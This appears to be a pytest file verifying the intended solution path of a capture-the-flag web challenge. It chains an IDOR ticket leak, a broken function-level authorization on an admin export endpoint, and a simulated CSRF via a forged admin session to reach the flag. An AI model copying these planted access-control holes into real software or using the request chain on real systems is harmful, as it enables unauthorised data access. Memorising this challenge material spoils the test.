import importlib

import pytest


@pytest.fixture()
def client(tmp_path, monkeypatch):
    monkeypatch.setenv("DATABASE_PATH", str(tmp_path / "test.db"))
    monkeypatch.setenv("FLAG", "ASC{test_flag}")
    import app as app_module

    importlib.reload(app_module)
    app_module.app.config.update(TESTING=True)
    return app_module.app.test_client()


def login_customer(client):
    return client.post(
        "/login",
        data={"username": "customer11", "password": "givemetheflag"},
        follow_redirects=False,
    )


def test_full_vulnerability_chain(client):
    assert login_customer(client).status_code == 302

    # IDOR: 일반 사용자가 내부 Ticket 메타데이터를 조회합니다.
    ticket = client.get("/api/tickets/CS-261101-07209?code=anything")
    assert ticket.status_code == 200
    assert ticket.get_json()["attachmentId"] == "a8f2c19e"

    # 첨부파일 자체는 정상적으로 차단됩니다.
    assert client.get("/api/attachments/a8f2c19e").status_code == 403

    # BFLA: 일반 사용자가 관리자 전용 Export Job을 생성합니다.
    export = client.post("/api/admin/attachments/a8f2c19e/exports")
    assert export.status_code == 201
    job_id = export.get_json()["jobId"]
    assert client.get(f"/api/exports/{job_id}/download").status_code == 403

    # 일반 사용자는 최종 공유 기능을 직접 실행할 수 없습니다.
    assert client.post(
        f"/api/admin/exports/{job_id}/share", data={"enabled": "true"}
    ).status_code == 403

    # 관리자 세션에서 CSRF 요청이 실행된 상황을 재현합니다.
    with client.session_transaction() as session:
        session["user_id"] = 1
    shared = client.post(
        f"/api/admin/exports/{job_id}/share", data={"enabled": "true"}
    )
    assert shared.status_code == 200
    public_url = shared.get_json()["publicUrl"]
    assert b"ASC{test_flag}" in client.get(public_url).data

